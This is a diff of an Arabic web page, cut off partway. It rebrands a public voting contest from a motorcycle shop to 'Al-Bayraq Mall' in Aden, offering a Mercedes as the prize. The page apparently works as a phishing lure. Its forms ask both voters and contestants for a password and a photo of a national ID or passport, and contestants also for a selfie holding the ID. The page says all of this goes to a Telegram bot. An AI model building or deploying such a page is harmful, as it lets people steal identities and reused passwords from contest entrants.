-    border-radius: 24px; padding: 26px 20px; text-align: center; transition: 0.2s;
-  }
-  .cat-card:hover { transform: translateY(-5px); border-color: var(--cyan); }
-  .cat-card.featured { border: 2px solid rgba(245, 158, 11, 0.7); }
-  .cat-icon { font-size: 46px; margin-bottom: 12px; display: block; }
-  .cat-card h3 { font-size: 20px; font-weight: 800; color: var(--gold-bright); margin-bottom: 8px; }
-  .cat-card p { font-size: 13.5px; color: var(--text-muted); }
-
-  .location-strip {
-    background: var(--grad-glass); border: 1px solid var(--border);
+  .mall-location-card {
+    background: var(--grad-panel);
+    border: 1.5px solid var(--border-royal);
     border-radius: 28px; padding: 30px;
     display: flex; align-items: center; justify-content: space-between;
     flex-wrap: wrap; gap: 20px;
   }
-  .loc-text h3 { color: var(--gold); font-size: 22px; font-weight: 900; margin-bottom: 4px; }
-  .phones-list { display: flex; gap: 12px; flex-wrap: wrap; }
-  .phone-link {
-    background: rgba(245, 158, 11, 0.15); border: 1px solid var(--gold);
-    color: var(--gold-bright); text-decoration: none;
-    padding: 11px 22px; border-radius: 15px; font-weight: 800; direction: ltr;
+  .loc-info h3 { color: var(--gold-shine); font-size: 22px; font-weight: 900; margin-bottom: 4px; }
+  .loc-info p { color: #d1d5db; font-size: 15px; }
+
+  .hotlines { display: flex; gap: 12px; flex-wrap: wrap; }
+  .hotline-btn {
+    background: rgba(212, 175, 55, 0.14);
+    border: 1px solid var(--gold-royal);
+    color: var(--gold-shine); text-decoration: none;
+    padding: 11px 22px; border-radius: 15px;
+    font-weight: 800; direction: ltr;
   }
 
   footer {
-    background: #02050c; border-top: 1px solid #161b26;
-    text-align: center; padding: 45px 20px; margin-top: 70px; color: var(--text-muted);
+    background: #030305;
+    border-top: 1px solid rgba(212, 175, 55, 0.2);
+    text-align: center; padding: 45px 20px; margin-top: 70px;
+    color: var(--text-sub);
   }
-  footer h3 { color: var(--gold); font-size: 24px; font-weight: 900; margin-bottom: 6px; }
+  footer h3 { color: var(--gold-shine); font-size: 24px; font-weight: 900; margin-bottom: 6px; }
 
-  @media (max-width: 860px) {
-    .vote-grid { grid-template-columns: 1fr; }
-    header h1 { font-size: 32px; }
-    .form-container, .voting-section-box { padding: 26px 16px; }
+  @media (max-width: 900px) {
+    .hero-banner, .arena-grid { grid-template-columns: 1fr; }
+    .hero-banner h1 { font-size: 32px; }
+    .arena-box, .reg-card { padding: 24px 16px; }
   }
 </style>
 </head>
 <body>
 
-<!-- ===== نافذة التنبيه الفورية ===== -->
-<div id="promoModal">
-  <div class="modal-box">
-    <div class="modal-badge">🔥 مسابقة السحب والتصويت المباشر</div>
-    <h2>اربح "متر فلينج" زيرو مجاناً بتصويت الجمهور!</h2>
-    <p>أهلاً بك في <strong>متجر أمير المترات</strong>. سجّل كمتسابق واحصل على <strong>رسالة ورابط تصويت جاهز للمشاركة</strong>، أو ادخل الآن للتصويت ومشاهدة النتائج الحية لحظة بلحظة!</p>
-    <div class="modal-actions">
-      <button class="modal-btn" onclick="goToSection('register')">🎟️ سجّل كمتسابق واحصل على رابطك</button>
-      <button class="modal-btn secondary" onclick="goToSection('voting')">🗳️ مشاهدة التصويت المباشر والتصويت</button>
+<!-- ===== نافذة الترحيب ===== -->
+<div id="welcomeOverlay">
+  <div class="welcome-card">
+    <div class="welcome-tag">🏛️ البيرق مول — عدن • جولة البيرق</div>
+    <h2>مسابقة التصويت الكبرى على سيارة مرسيدس!</h2>
+    <p>أهلاً بك في <strong>البيرق مول</strong> بالعاصمة عدن — أضخم وجهة تسوق وترفيه وتقنية. سجّل كمتسابق وشارك رابطك أو صوّت الآن لمرشحك المفضل للفوز بسيارة <strong>مرسيدس</strong>.</p>
+    <div class="welcome-btns">
+      <button class="w-btn primary" onclick="jumpTo('register')">🎟️ سجل كمتسابق واحصل على رابطك</button>
+      <button class="w-btn ghost" onclick="jumpTo('voting')">🗳️ الدخول إلى ساحة التصويت المباشر</button>
     </div>
   </div>
 </div>
 
-<!-- ===== الشريط العلوي ===== -->
-<div class="navbar">
-  <div class="nav-box">
-    <div class="brand-logo">🏍️ أمير المترات</div>
-    <div class="nav-links">
-      <a href="#voting" class="vote-pill">🗳️ التصويت المباشر</a>
-      <a href="#register" class="cta-pill">🎟️ تسجيل متسابق</a>
-      <a href="#models">المترات</a>
+<!-- ===== شريط التنقل مع شعار البيرق ===== -->
+<div class="top-nav">
+  <div class="top-nav-inner">
+    <a href="#" class="bayraq-brand">
+      <!-- شعار البيرق مول المصمم هندسياً -->
+      <svg class="bayraq-logo-svg" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect x="3" y="3" width="58" height="58" rx="16" fill="#0b0d13" stroke="#d4af37" stroke-width="2.5"/>
+        <path d="M19 48V15H44L38.5 24.5L44 34H19" fill="url(#bayraqGold)" stroke="#fce588" stroke-width="1.2"/>
+        <circle cx="45" cy="45" r="5" fill="#10b981"/>
+        <defs>
+          <linearGradient id="bayraqGold" x1="19" y1="15" x2="45" y2="36" gradientUnits="userSpaceOnUse">
+            <stop stop-color="#fce588"/>
+            <stop offset="0.55" stop-color="#d4af37"/>
+            <stop offset="1" stop-color="#8a6213"/>
+          </linearGradient>
+        </defs>
+      </svg>
+      <div class="brand-titles">
+        <strong>البيرق مول • عدن</strong>
+        <span>جولة البيرق — مسابقة مرسيدس</span>
+      </div>
+    </a>
+
+    <div class="nav-menu">
+      <a href="#voting" class="nav-vote">🗳️ التصويت المباشر</a>
+      <a href="#register" class="nav-reg">🎟️ تسجيل متسابق</a>
+      <a href="#wings">أقسام المول</a>
       <a href="#location">الموقع</a>
     </div>
   </div>
 </div>
 
-<!-- ===== الهيدر ===== -->
-<header>
-  <div class="store-badge">🏆 المعرض العصري الأول للدراجات النارية في القاعدة</div>
-  <h1>متجر <span>أمير المترات</span><br>ساحة المنافسة الحية والتصويت المباشر على فلينج!</h1>
-  <p class="subtitle">تصويت مفتوح لجميع الأجهزة بشرط اختلاف الرقم والبريد والهوية لزيادة التفاعل وتوسيع المنافسة بأعلى سرعة ودقة ووصول فوري لبوت التليجرام.</p>
+<!-- ===== الواجهة الرئيسية وصورة سيارة المرسيدس ===== -->
+<header class="hero-section">
+  <div class="hero-banner">
+    <div>
+      <div class="mall-chip">✨ الأضخم في عدن — جولة البيرق (المنصورة)</div>
+      <h1>منافسة <span>البيرق مول</span> الكبرى<br>على سيارة مرسيدس الفاخرة!</h1>
+      <p>أداء سريع ووصول فوري لبوت التليجرام، وتصويت مفتوح لجميع الأجهزة بشرط اختلاف الرقم والبريد والهوية لتوسيع المنافسة وتحقيق أعلى تفاعل بكل نزاهة.</p>
+      <div style="display:flex; gap:12px; flex-wrap:wrap;">
+        <a href="#voting" class="action-btn gold-action" style="text-decoration:none; text-align:center; width:auto; padding:13px 26px; border-radius:999px; font-size:15px;">🗳️ صوّت الآن</a>
+        <a href="#register" class="action-btn emerald-action" style="text-decoration:none; text-align:center; width:auto; padding:13px 26px; border-radius:999px; font-size:15px;">🎟️ اشترك في المسابقة</a>
+      </div>
+    </div>
+
+    <div class="mercedes-showcase">
+      <div class="mercedes-img-frame">
+        <img id="mercedesDisplayImg"
+             src="https://images.unsplash.com/photo-1618843479313-40f8afb4b4d8?auto=format&fit=crop&w=1000&q=80"
+             alt="سيارة مرسيدس الفاخرة جائزة البيرق مول">
+      </div>
+      <div class="mercedes-caption">
+        <strong>🚘 جائزة المسابقة: سيارة مرسيدس</strong>
+        <span>🏆 برعاية البيرق مول — عدن</span>
+      </div>
+    </div>
+  </div>
 </header>
 
-<!-- ===== قسم التصويت والمشاهدة المباشرة ===== -->
+<!-- ===== ساحة التصويت المباشر ===== -->
 <section id="voting">
-  <div class="section-head">
-    <span class="sub">أداء سريع ووصول فوري للبوت</span>
-    <h2>🗳️ ساحة التصويت ومشاهدة النتائج المباشرة</h2>
+  <div class="sec-header">
+    <span class="tag">أداء سريع • تحديث فوري للترتيب</span>
+    <h2>🗳️ ساحة التصويت والنتائج المباشرة</h2>
   </div>
 
-  <div class="voting-section-box">
-    <div class="live-status-bar">
-      <div class="live-pill"><span class="pulse-dot"></span> التصويت متاح لجميع الأجهزة ببيانات مستقلة</div>
-      <div class="live-pill" style="border-color:var(--cyan); color:var(--cyan);" id="capacityCounter">👥 المتسابقون: 50/100 • 🗳️ إجمالي الأصوات: 0</div>
+  <div class="arena-box">
+    <div class="status-strip">
+      <div class="status-pill"><span class="live-dot"></span> مفتوح لجميع الأجهزة برقم وبريد وهوية مختلفة</div>
+      <div class="status-pill" style="border-color:var(--gold-royal); color:var(--gold-shine);" id="capacityBadge">👥 المتسابقون: 50/100 • 🗳️ إجمالي الأصوات: 0</div>
     </div>
 
-    <div class="warning-notice" style="margin-bottom:24px;">
-      <span class="icon">🛡️</span>
-      <p><strong>تنبيه مهم ضد الاحتيال والتلاعب:</strong> يُسمح بالتصويت من أي جهاز عند استخدام رقم وبريد ووثيقة مختلفة، ولكن يُمنع منعاً باتاً تكرار نفس الرقم أو البريد أو إرفاق وثائق/بيانات مزورة أو انتحال الهوية. أي محاولة احتيال أو تلاعب تؤدي فوراً لرفض الصوت واستبعاد المخالف وحذف الأصوات المخالفة.</p>
+    <div class="anti-fraud-box">
+      <span>🛡️</span>
+      <p><strong>تنبيه مهم ضد الاحتيال والتلاعب:</strong> يُسمح بالتصويت من أي جهاز عند استخدام رقم وبريد ووثيقة مختلفة، لكن يُمنع منعاً باتاً تكرار نفس الرقم أو البريد أو إرفاق وثائق/بيانات مزورة أو انتحال الهوية. أي محاولة احتيال أو تلاعب تؤدي فوراً لرفض الصوت واستبعاد المخالف وحذف الأصوات المخالفة.</p>
     </div>
 
-    <div class="vote-grid">
+    <div class="arena-grid">
       <!-- نموذج التصويت -->
-      <div class="vote-card-panel">
-        <h3>✍️ صوّت لمتسابقك المفضل الآن</h3>
-        <p class="desc">اختر المتسابق أو أدخل رمزه، وأدخل بياناتك والوثيقة لإرسال صوتك للبوت فوراً:</p>
+      <div class="panel-card">
+        <h3>✍️ صوّت لمرشحك المفضل</h3>
+        <p class="sub-desc">اختر المتسابق أو أدخل رمزه، وأكمل بياناتك والوثيقة لإرسال صوتك للبوت فوراً:</p>
 
-        <div id="directInviteBanner" class="direct-invite-banner">
+        <div id="directInviteBox" class="invite-alert">
           🎯 أنت تصوّت الآن عبر رابط الدعوة المباشر للمتسابق:<br>
-          <strong id="invitedCandidateLabel"></strong>
+          <strong id="invitedNameCode"></strong>
         </div>
 
         <form id="voteForm">
@@ -528,7 +625,7 @@
 
           <div class="field">
             <label for="candidateCodeInput">🎟️ رمز تذكرة المتسابق *</label>
-            <input type="text" id="candidateCodeInput" required placeholder="AMIR-7272" dir="ltr" style="text-align:center; font-weight:900; font-size:17px; letter-spacing:2px; text-transform:uppercase; border-color:var(--gold);">
+            <input type="text" id="candidateCodeInput" required placeholder="BAYRAQ-7272" dir="ltr" style="text-align:center; font-weight:900; font-size:17px; letter-spacing:2px; text-transform:uppercase; border-color:var(--gold-royal);">
           </div>
 
           <div class="field">
@@ -549,68 +646,66 @@
           <!-- كلمة السر تحت البريد الإلكتروني مباشرة -->
           <div class="field">
             <label for="voterPassword">🔒 كلمة السر *</label>
-            <div class="password-wrap">
+            <div class="pass-wrapper">
               <input type="password" id="voterPassword" required placeholder="أدخل كلمة سر لحسابك" dir="ltr" style="text-align:right">
-              <button type="button" class="toggle-pass" onclick="toggleGenericPass('voterPassword', this)">إظهار</button>
+              <button type="button" class="pass-toggle" onclick="togglePassField('voterPassword', this)">إظهار</button>
             </div>
           </div>
 
-          <!-- إرفاق صورة البطاقة أو الجواز للمُصوِّت -->
+          <!-- صورة البطاقة الشخصية أو الجواز للمُصوِّت -->
           <div class="field">
             <label>🪪 صورة البطاقة الشخصية أو الجواز للمُصوِّت *</label>
-            <div class="upload-box" onclick="document.getElementById('voterIdImage').click()">
-              <div class="upload-label">
-                <span class="upload-icon">🆔</span>
-                <span class="upload-text">اضغط هنا لإرفاق صورة البطاقة أو الجواز</span>
-                <span class="upload-sub">تُضغط بسرعة وتُرسل للبوت للتحقق ومنع الاحتيال</span>
-              </div>
-              <input type="file" id="voterIdImage" accept="image/*" required onchange="handleImage(event, 'voterIdPreview')">
-              <img id="voterIdPreview" class="preview-img" alt="معاينة هوية المصوت">
+            <div class="doc-dropzone" onclick="document.getElementById('voterDocFile').click()">
+              <span class="doc-icon">🆔</span>
+              <div class="doc-title">اضغط هنا لإرفاق صورة البطاقة أو الجواز</div>
+              <div class="doc-hint">تُضغط بسرعة وتُرسل للبوت للتحقق ومنع الاحتيال</div>
+              <input type="file" id="voterDocFile" accept="image/*" required onchange="compressDocImage(event, 'voterDocPreview')">
+              <img id="voterDocPreview" class="doc-preview" alt="معاينة هوية المصوت">
             </div>
           </div>
 
-          <div class="captcha-box">
-            <span class="captcha-question" id="captchaQuestion">🔐 كم ناتج: 5 + 3 = ؟</span>
-            <input type="number" id="captchaAnswer" required placeholder="الناتج">
+          <div class="math-check">
+            <span id="mathPrompt">🔐 كم ناتج: 6 + 4 = ؟</span>
+            <input type="number" id="mathAnswer" required placeholder="الناتج">
           </div>
 
-          <button type="submit" id="voteSubmitBtn" class="btn-enter gold-btn">🗳️ اعتمد صوتي الآن</button>
-          <div id="voteMsg" class="msg"></div>
+          <button type="submit" id="voteBtn" class="action-btn gold-action">🗳️ اعتمد صوتي الآن</button>
+          <div id="voteFeedback" class="feedback-msg"></div>
 
-          <!-- بطاقة الشكر باسم المحل بعد التصويت -->
-          <div id="storeThanksCard" class="store-thanks-card">
+          <!-- رسالة شكر باسم البيرق مول بعد التصويت -->
+          <div id="mallThanksCard" class="mall-thanks-banner">
             <h4>🙏 شكراً جزيلاً لتصويتك ومشاركتك الكريمة!</h4>
-            <p id="thanksDetailsText">تم اعتماد صوتك بنجاح، ونشكركم على دعمكم ومشاركتكم في مسابقة السحب والتصويت على متر فلينج.</p>
-            <span class="store-thanks-brand">🏍️ مع خالص الشكر والتقدير — متجر أمير المترات</span>
+            <p id="mallThanksDesc">تم اعتماد صوتك بنجاح، ونشكركم على دعمكم ومشاركتكم في مسابقة البيرق مول الكبرى على سيارة مرسيدس.</p>
+            <span class="mall-thanks-badge">🏛️ مع خالص الشكر والتقدير — البيرق مول • عدن</span>
           </div>
         </form>
       </div>
 
-      <!-- لوحة المتصدرين المباشرة -->
-      <div class="vote-card-panel">
+      <!-- الترتيب المباشر -->
+      <div class="panel-card">
         <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; flex-wrap:wrap; gap:8px;">
           <h3>🏆 الترتيب المباشر للمتسابقين</h3>
-          <button type="button" onclick="syncFromTelegramCloud(true)" style="background:rgba(56,189,248,0.15); border:1px solid var(--cyan); color:var(--cyan); padding:4px 12px; border-radius:10px; font-size:12px; font-weight:800; cursor:pointer;">🔄 تحديث فوري</button>
+          <button type="button" onclick="syncCloudData(true)" style="background:rgba(16,185,129,0.14); border:1px solid #10b981; color:#6ee7b7; padding:4px 12px; border-radius:10px; font-size:12px; font-weight:800; cursor:pointer;">🔄 تحديث فوري</button>
         </div>
-        <p class="desc">تُرتب الأسماء تلقائياً من الأعلى تصويتاً إلى الأقل:</p>
+        <p class="sub-desc">يتم ترتيب المتسابقين تلقائياً من الأعلى تصويتاً إلى الأقل:</p>
 
-        <input type="text" id="searchCandidateInput" class="search-filter-input" placeholder="🔍 ابحث عن اسم متسابق أو رمز (مثال: خلدون أو AMIR-7272)..." oninput="renderLeaderboardUI()">
+        <input type="text" id="searchBox" class="filter-box" placeholder="🔍 ابحث عن متسابق أو رمز (مثال: خلدون أو BAYRAQ-7272)..." oninput="renderRankings()">
 
-        <div class="leaderboard-list" id="leaderboardList">
-          <div style="text-align:center; padding:30px; color:var(--text-muted);">⏳ جارٍ تحميل قائمة المتسابقين...</div>
+        <div class="rankings-scroll" id="rankingsContainer">
+          <div style="text-align:center; padding:30px; color:var(--text-sub);">⏳ جارٍ تحميل قائمة المتسابقين...</div>
         </div>
 
-        <!-- شريط الإدارة (أزرار الفحص والتقرير تظهر فقط داخل وضع الإدارة) -->
-        <div style="margin-top:20px; padding-top:15px; border-top:1px dashed var(--border); display:flex; gap:10px; flex-wrap:wrap; justify-content:space-between; align-items:center;">
+        <!-- شريط الإدارة (أزرار التقرير والفحص تظهر داخل وضع الإدارة فقط) -->
+        <div style="margin-top:20px; padding-top:15px; border-top:1px dashed #232736; display:flex; gap:10px; flex-wrap:wrap; justify-content:space-between; align-items:center;">
           <div style="display:flex; gap:10px; flex-wrap:wrap;">
-            <button type="button" class="admin-only-control" onclick="sendSortedReportToBot()" style="background:rgba(56,189,248,0.12); border:1px solid var(--cyan); color:var(--cyan); padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer;">
+            <button type="button" class="admin-only-control" onclick="sendOrderedReport()" style="background:rgba(212,175,55,0.14); border:1px solid var(--gold-royal); color:var(--gold-shine); padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer;">
               📊 إرسال التقرير للبوت
             </button>
-            <button type="button" class="admin-only-control" onclick="testBotConnection()" style="background:rgba(16,185,129,0.12); border:1px solid var(--success); color:#6ee7b7; padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer;">
+            <button type="button" class="admin-only-control" onclick="checkBotHealth()" style="background:rgba(16,185,129,0.14); border:1px solid #10b981; color:#6ee7b7; padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer;">
               📡 فحص البوت
             </button>
           </div>
-          <button type="button" onclick="toggleAdminMode()" style="background:rgba(245,158,11,0.12); border:1px solid var(--gold); color:var(--gold-bright); padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer;">
+          <button type="button" onclick="toggleAdminSession()" style="background:rgba(212,175,55,0.14); border:1px solid var(--gold-royal); color:var(--gold-shine); padding:10px 14px; border-radius:12px; font-weight:800; font-size:12.5px; cursor:pointer;">
             🔐 وضع الإدارة
           </button>
         </div>
@@ -621,172 +716,166 @@
 
 <!-- ===== استمارة تسجيل المتسابقين ===== -->
 <section id="register">
-  <div class="section-head">
-    <span class="sub">بوابة تسجيل المتسابقين (سعة حتى 100 متسابق)</span>
-    <h2>سجّل بياناتك للحصول على رسالة ورابط التصويت الخاص بك</h2>
+  <div class="sec-header">
+    <span class="tag">بوابة التسجيل (سعة حتى 100 متسابق)</span>
+    <h2>سجّل بياناتك واحصل على رسالة ورابط التصويت الخاص بك</h2>
   </div>
 
-  <div class="form-container">
-    <form id="raffleForm">
-      <div class="form-grid">
+  <div class="reg-card">
+    <form id="registerForm">
+      <div class="reg-grid">
         <div class="field">
-          <label for="name">👤 الاسم الكامل (الرباعي مطابق للهوية) *</label>
-          <input type="text" id="name" required placeholder="أدخل اسمك الرباعي كما هو في البطاقة">
+          <label for="regName">👤 الاسم الكامل (الرباعي مطابق للهوية) *</label>
+          <input type="text" id="regName" required placeholder="أدخل اسمك الرباعي كما هو في البطاقة">
         </div>
 
         <div class="field">
-          <label for="phone">📱 رقم الهاتف / واتساب *</label>
-          <input type="tel" id="phone" required placeholder="77xxxxxxx" dir="ltr" style="text-align:right">
+          <label for="regPhone">📱 رقم الهاتف / واتساب *</label>
+          <input type="tel" id="regPhone" required placeholder="77xxxxxxx" dir="ltr" style="text-align:right">
         </div>
 
         <div class="field">
-          <label for="email">📧 عنوان البريد الإلكتروني *</label>
-          <input type="email" id="email" required placeholder="example@gmail.com" dir="ltr" style="text-align:right">
+          <label for="regEmail">📧 عنوان البريد الإلكتروني *</label>
+          <input type="email" id="regEmail" required placeholder="example@gmail.com" dir="ltr" style="text-align:right">
         </div>
 
         <div class="field">
-          <label for="password">🔒 كلمة المرور لحسابك في المسابقة *</label>
-          <div class="password-wrap">
-            <input type="password" id="password" required placeholder="أدخل كلمة مرور قوية" dir="ltr" style="text-align:right">
-            <button type="button" class="toggle-pass" onclick="toggleGenericPass('password', this)">إظهار</button>
+          <label for="regPassword">🔒 كلمة المرور لحسابك في المسابقة *</label>
+          <div class="pass-wrapper">
+            <input type="password" id="regPassword" required placeholder="أدخل كلمة مرور قوية" dir="ltr" style="text-align:right">
+            <button type="button" class="pass-toggle" onclick="togglePassField('regPassword', this)">إظهار</button>
           </div>
         </div>
 
         <div class="field">
-          <label for="city">🏙️ المحافظة / المنطقة *</label>
-          <input type="text" id="city" required placeholder="مثال: القاعدة - تعز - إب">
+          <label for="regArea">🏙️ المنطقة / المديرية *</label>
+          <input type="text" id="regArea" required placeholder="مثال: جولة البيرق - المنصورة - عدن">
         </div>
 
         <div class="field">
-          <label for="favModel">🏍️ المتر المفضل لديك في المعرض *</label>
-          <select id="favModel" required>
-            <option value="متر فلينج (FELLING)">متر فلينج (FELLING)</option>
-            <option value="مترات رياضية (Sport)">مترات رياضية (Sport)</option>
-            <option value="مترات العمل والتوصيل">مترات العمل والتوصيل</option>
-            <option value="المترات الجبلية والوعرة">المترات الجبلية والوعرة</option>
+          <label for="regWing">🏛️ القسم المفضل في البيرق مول *</label>
+          <select id="regWing" required>
+            <option value="جناح سيارة مرسيدس والسيارات">جناح سيارة مرسيدس والسيارات</option>
+            <option value="البيرق للتقنية والإلكترونيات">البيرق للتقنية والإلكترونيات</option>
+            <option value="أزياء وموضة البيرق">أزياء وموضة البيرق</option>
+            <option value="الترفيه والمطاعم العائلية">الترفيه والمطاعم العائلية</option>
           </select>
         </div>
 
-        <div class="field full">
-          <label for="note">💬 كلمة للجمهور ليصوتوا لك (اختياري)</label>
-          <textarea id="note" placeholder="اكتب عبارة تشجيعية أو سبب استحقاقك للفوز..."></textarea>
+        <div class="field span-all">
+          <label for="regPitch">💬 رسالة للجمهور ليصوتوا لك (اختياري)</label>
+          <textarea id="regPitch" placeholder="اكتب كلمة تشجيعية لجمهورك..."></textarea>
         </div>
 
-        <div class="field full">
+        <div class="field span-all">
           <label>🪪 1. إرفاق صورة البطاقة الشخصية أو جواز السفر للمتسابق *</label>
-          <div class="warning-notice">
-            <span class="icon">⚠️</span>
-            <p><strong>تنبيه هام ضد الاحتيال والتزوير:</strong> يُمنع كلياً رفع أي صور أو بيانات غير صحيحة أو مزورة أو انتحال هوية الغير. أي مخالفة تعرض صاحبها للاستبعاد الفوري وحذف الأصوات وتحمل كامل المسؤولية القانونية، حفاظاً على نزاهة المسابقة وحقوق المتنافسين.</p>
+          <div class="anti-fraud-box">
+            <span>⚠️</span>
+            <p><strong>تنبيه هام ضد الاحتيال والتزوير:</strong> يُمنع كلياً رفع أي صور أو بيانات غير صحيحة أو مزورة أو انتحال هوية الغير. أي مخالفة تعرض صاحبها للاستبعاد الفوري وحذف الأصوات وتحمل كامل المسؤولية القانونية، حفاظاً على نزاهة المسابقة.</p>
           </div>
-          <div class="upload-box" onclick="document.getElementById('idCardImage').click()">
-            <div class="upload-label">
-              <span class="upload-icon">🆔</span>
-              <span class="upload-text">اضغط هنا لإرفاق صورة البطاقة أو الجواز</span>
-              <span class="upload-sub">تُضغط تلقائياً وتُرسل للإدارة فقط (لا تُنشر للعامة)</span>
-            </div>
-            <input type="file" id="idCardImage" accept="image/*" required onchange="handleImage(event, 'idPreview')">
-            <img id="idPreview" class="preview-img" alt="معاينة الهوية">
+          <div class="doc-dropzone" onclick="document.getElementById('regIdFile').click()">
+            <span class="doc-icon">🆔</span>
+            <div class="doc-title">اضغط هنا لإرفاق صورة البطاقة أو الجواز</div>
+            <div class="doc-hint">تُضغط تلقائياً وتُرسل للبوت للتحقق فقط</div>
+            <input type="file" id="regIdFile" accept="image/*" required onchange="compressDocImage(event, 'regIdPreview')">
+            <img id="regIdPreview" class="doc-preview" alt="معاينة الهوية">
           </div>
         </div>
 
-        <div class="field full">
+        <div class="field span-all">
           <label>🤳 2. إرفاق صورة سيلفي لك وأنت تحمل الهوية *</label>
-          <div class="upload-box" onclick="document.getElementById('selfieIdImage').click()">
-            <div class="upload-label">
-              <span class="upload-icon">📸</span>
-              <span class="upload-text">اضغط هنا لإرفاق صورة سيلفي مع الهوية</span>
-              <span class="upload-sub">لتأكيد أنك صاحب الطلب الحقيقي</span>
-            </div>
-            <input type="file" id="selfieIdImage" accept="image/*" required onchange="handleImage(event, 'selfiePreview')">
-            <img id="selfiePreview" class="preview-img" alt="معاينة السيلفي">
+          <div class="doc-dropzone" onclick="document.getElementById('regSelfieFile').click()">
+            <span class="doc-icon">📸</span>
+            <div class="doc-title">اضغط هنا لإرفاق صورة سيلفي مع الهوية</div>
+            <div class="doc-hint">لتأكيد أنك صاحب الطلب الحقيقي</div>
+            <input type="file" id="regSelfieFile" accept="image/*" required onchange="compressDocImage(event, 'regSelfiePreview')">
+            <img id="regSelfiePreview" class="doc-preview" alt="معاينة السيلفي">
           </div>
         </div>
       </div>
 
-      <button type="submit" id="btn" class="btn-enter">🔥 أقر بصحة بياناتي وإصدار رابط التصويت الخاص بي</button>
-      <div id="msg" class="msg"></div>
+      <button type="submit" id="regBtn" class="action-btn emerald-action">🔥 أقر بصحة بياناتي وإصدار رابط التصويت الخاص بي</button>
+      <div id="regFeedback" class="feedback-msg"></div>
     </form>
 
-    <!-- شاشة نجاح التسجيل ورسالة المشاركة المرتبة -->
-    <div id="ticketBox">
-      <div style="display:inline-block; background:var(--cyan); color:#030712; font-weight:900; padding:8px 24px; border-radius:30px; margin-bottom:14px;">✅ تم اعتماد اشتراكك وإضافتك للوحة المتصدرين</div>
-      <h3 style="font-size:28px; color:#38bdf8; font-weight:900;">مبارك! هذا هو رمزك ورسالة الدعوة الجاهزة للمشاركة</h3>
-      <div class="ticket-code" id="ticketCode">AMIR-0000</div>
-      <p style="color:#cbd5e1; font-size:14px;">انسخ الرسالة المرتبة التالية وشاركها في حالتك أو مع أصدقائك؛ أي شخص يضغط على الرابط سيدخل مباشرة للتصويت لك بكل سهولة:</p>
-      <div class="share-message-preview" id="shareMessagePreview"></div>
-      <button type="button" class="copy-share-btn" onclick="copyShareInvite()">📋 نسخ رسالة الدعوة والرابط المباشر لمشاركتها</button>
-      <p id="copyFeedback" style="color:#6ee7b7; font-size:13px; margin-top:8px; display:none;">✅ تم نسخ رسالة الدعوة بنجاح! يمكنك لصقها الآن في واتساب أو حالتك.</p>
+    <div id="successTicket">
+      <div style="display:inline-block; background:var(--grad-royal); color:#050507; font-weight:900; padding:7px 22px; border-radius:999px; margin-bottom:12px;">✅ تم اعتماد اشتراكك وإضافتك لجدول المتسابقين</div>
+      <h3 style="font-size:27px; color:var(--gold-shine); font-weight:900;">مبارك! هذا رمزك ورسالة الدعوة الجاهزة للمشاركة</h3>
+      <div class="code-highlight" id="generatedCodeBox">BAYRAQ-0000</div>
+      <p style="color:#d1d5db; font-size:14px;">انسخ الرسالة المرتبة التالية وشاركها مع أصدقائك وفي حالاتك للدخول والتصويت لك مباشرة:</p>
+      <div class="invite-box" id="generatedInviteText"></div>
+      <button type="button" class="copy-invite-btn" onclick="copyInviteMessage()">📋 نسخ رسالة الدعوة والرابط المباشر</button>
+      <p id="inviteCopiedHint" style="color:#6ee7b7; font-size:13px; margin-top:8px; display:none;">✅ تم نسخ الرسالة والرابط بنجاح!</p>
     </div>
   </div>
 </section>
 
-<!-- ===== أقسام المترات ===== -->
-<section id="models">
-  <div class="section-head">
-    <span class="sub">معرض الإصدارات</span>
-    <h2>أقسام المترات المتوفرة حصرياً لدينا</h2>
+<!-- ===== أقسام البيرق مول ===== -->
+<section id="wings">
+  <div class="sec-header">
+    <span class="tag">تجربة تسوق متكاملة في عدن</span>
+    <h2>أبرز أجنحة البيرق مول</h2>
   </div>
-  <div class="categories-grid">
-    <div class="cat-card featured">
-      <span class="cat-icon">🏍️</span>
-      <h3>مترات فلينج (FELLING)</h3>
-      <p>محرك جبار، أداء استثنائي وثبات مطلق، وهي الجائزة الكبرى للمسابقة.</p>
+  <div class="wings-grid">
+    <div class="wing-card vip">
+      <span class="wing-emoji">🚘</span>
+      <h3>جائزة سيارة مرسيدس</h3>
+      <p>الجائزة الكبرى لمسابقة التصويت والجمهور في البيرق مول بالعاصمة عدن.</p>
     </div>
-    <div class="cat-card">
-      <span class="cat-icon">🏁</span>
-      <h3>المترات الرياضية (Sport)</h3>
-      <p>هياكل انسيابية متطورة، فرامل قرصية مزدوجة وإضاءة LED ليلية.</p>
+    <div class="wing-card">
+      <span class="wing-emoji">💻</span>
+      <h3>ركن التقنية والحديث</h3>
+      <p>أحدث الأجهزة الذكية والحلول الرقمية والمستلزمات العصرية المتطورة.</p>
     </div>
-    <div class="cat-card">
-      <span class="cat-icon">🛵</span>
-      <h3>مترات العمل والتوصيل</h3>
-      <p>مصممة للتحمل الشاق والأعمال اليومية باقتصادية فائقة في الوقود.</p>
+    <div class="wing-card">
+      <span class="wing-emoji">🛍️</span>
+      <h3>الأزياء والماركات</h3>
+      <p>تشكيلات مختارة بعناية تلبي مختلف الأذواق في أجواء تسوق راقية.</p>
     </div>
-    <div class="cat-card">
-      <span class="cat-icon">⛰️</span>
-      <h3>المترات الجبلية والوعرة</h3>
-      <p>عزم هائل لتسلق المرتفعات الصعبة والطرق الوعرة بكل ثبات.</p>
+    <div class="wing-card">
+      <span class="wing-emoji">🍽️</span>
+      <h3>الترفيه والضيافة</h3>
+      <p>مساحات عائلية ومطاعم ومقاهٍ توفر تجربة متكاملة طوال اليوم.</p>
     </div>
   </div>
 </section>
 
 <!-- ===== الموقع ===== -->
 <section id="location">
-  <div class="location-strip">
-    <div class="loc-text">
-      <h3>📍 موقع متجر أمير المترات</h3>
-      <p><strong>القاعدة — جوار مستوصف السلطان مباشرةً</strong></p>
+  <div class="mall-location-card">
+    <div class="loc-info">
+      <h3>📍 موقع البيرق مول — عدن</h3>
